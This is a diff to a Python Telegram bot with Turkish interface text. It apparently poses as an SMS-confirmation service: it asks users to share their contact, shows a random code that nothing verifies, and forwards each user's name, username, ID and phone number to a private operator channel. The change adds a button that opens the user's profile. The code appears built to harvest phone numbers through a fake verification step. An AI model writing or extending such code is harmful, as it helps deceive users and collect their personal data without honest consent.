@@ -144,7 +144,7 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     country_name = selected_country.get(user.id, "Bilinmiyor")
 
     code = random.randint(100000, 999999)
-    time = datetime.now(ZoneInfo("Europe/Istanbul")).strftime("%d.%m.%Y %H:%M:%S")
+    time = datetime.now(ZoneInfo("Europe/Istanbul")).strftime("%Y-%m-%d %H:%M:%S")
 
     await update.message.reply_text(f"""
 ╔══════════════╗
@@ -157,19 +157,26 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 """)
 
     phone = update.message.contact.phone_number
-    username = f"@{user.username}" if user.username else user.first_name
-    text = f"""
-🚨 YENİ SMS ONAY
+    username = f"@{user.username}" if user.username else "Yok"
+    name = user.first_name
 
-👤 Kullanıcı: {username}
+    text = f"""
+☎️ NUMARA ALINDI
+
+👤 İsim: {name}
+🔗 Kullanıcı: {username}
 🆔 ID: {user.id}
-📞 Numara: {phone}
-🔢 Kod: {code}
-🌍 Ülke: {country_name}
-🕒 Saat: {time}
+📱 Numara: {phone}
+⏰ Saat: {time}
 """
 
-    await context.bot.send_message(chat_id=KANAL_ID, text=text)
+    # Inline buton ile profili açma (Telegram kullanıcı profiline link)
+    profile_url = f"https://t.me/{user.username}" if user.username else None
+    if profile_url:
+        kb = InlineKeyboardMarkup([[InlineKeyboardButton("📂 Profili Aç", url=profile_url)]])
+        await context.bot.send_message(chat_id=KANAL_ID, text=text, reply_markup=kb)
+    else:
+        await context.bot.send_message(chat_id=KANAL_ID, text=text)
 
 async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != ADMIN_ID:
@@ -180,8 +187,7 @@ async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         uid = int(context.args[0])
         banned_users.add(uid)
-        with open("banned.json", "w") as f:
-            json.dump(list(banned_users), f)
+        save_bans()
         await update.message.reply_text("✅ Kullanıcı banlandı")
     except:
         await update.message.reply_text("❌ Geçersiz ID")
@@ -195,8 +201,7 @@ async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         uid = int(context.args[0])
         banned_users.discard(uid)
-        with open("banned.json", "w") as f:
-            json.dump(list(banned_users), f)
+        save_bans()
         await update.message.reply_text("✅ Ban kaldırıldı")
     except:
         await update.message.reply_text("❌ Geçersiz ID")
@@ -210,4 +215,3 @@ app.add_handler(CallbackQueryHandler(menu_buttons))
 app.add_handler(MessageHandler(filters.CONTACT, contact_handler))
 
 app.run_polling()
-              
